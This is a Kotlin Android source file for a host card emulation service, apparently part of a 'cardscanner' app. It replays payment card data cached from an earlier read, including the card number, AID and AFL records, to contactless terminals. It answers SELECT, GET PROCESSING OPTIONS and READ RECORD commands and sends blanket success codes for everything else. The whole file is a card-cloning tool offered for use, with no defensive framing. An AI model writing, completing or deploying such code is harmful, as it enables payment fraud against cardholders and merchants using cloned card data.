package com.example.cardscanner

import android.content.Context
import android.nfc.cardemulation.HostApduService
import android.os.Bundle
import android.util.Log

class MyCardEmulatorService : HostApduService() {

    override fun processCommandApdu(commandApdu: ByteArray?, extras: Bundle?): ByteArray {
        if (commandApdu == null) return hexStringToByteArray("6F00")
        val incomingHex = byteArrayToHexString(commandApdu)

        val prefs = getSharedPreferences("EMV_Payload_Cache", Context.MODE_PRIVATE)
        val cachedAid = prefs.getString("HEX_AID", "A0000000041010") ?: "A0000000041010"
        val cachedPan = prefs.getString("TAG_5A", "") ?: ""
        val cachedAfl = prefs.getString("TAG_94", "08010100") ?: "08010100"

        // PHASE 1: Terminal fires SELECT APPLICATION command
        if (incomingHex.startsWith("00A40400")) {
            Log.i("HCE_EMULATOR", "SoftPOS engagement triggered. Selecting AID: 0x$cachedAid")
            // Return FCI Template (6F) appending the custom extracted AID bytes + Success status
            val fciResponse = "6F1C8407" + cachedAid + "A511500A4D4153544552434152449F38039F37049000"
            return hexStringToByteArray(fciResponse)
        }

        // PHASE 2: Terminal fires GET PROCESSING OPTIONS (GPO) handshake
        if (incomingHex.startsWith("80A80000")) {
            Log.i("HCE_EMULATOR", "Processing GPO Request. Injecting custom AIP and AFL records.")
            // Enforce response format containing your custom chip AFL registers
            val gpoResponse = "770E820200809408" + cachedAfl + "9000"
            return hexStringToByteArray(gpoResponse)
        }

        // PHASE 3: Terminal requests READ RECORD data sectors
        if (incomingHex.startsWith("00B2")) {
            Log.i("HCE_EMULATOR", "Feeding unencrypted target record rows back to terminal.")
            // Wrap the stored PAN card details cleanly back inside Tag 5A payload templates
            val recordResponse = "70145A08" + cachedPan.padEnd(16, '0') + "9F24032912319000"
            return hexStringToByteArray(recordResponse)
        }

        return hexStringToByteArray("9000") // Universal success fallback for minor terminal queries
    }

    override fun onDeactivated(reason: Int) {
        Log.w("HCE_EMULATOR", "Contactless link terminated. State cleared. Reason: $reason")
    }

    private fun hexStringToByteArray(s: String): ByteArray {
        val len = s.length
        val data = ByteArray(len / 2)
        var i = 0
        while (i < len) {
            data[i / 2] = ((Character.digit(s[i], 16) shl 4) + Character.digit(s[i + 1], 16)).toByte()
            i += 2
        }
        return data
    }

    private fun byteArrayToHexString(bytes: ByteArray): String {
        return bytes.joinToString("") { String.format("%02X", it) }
    }
}
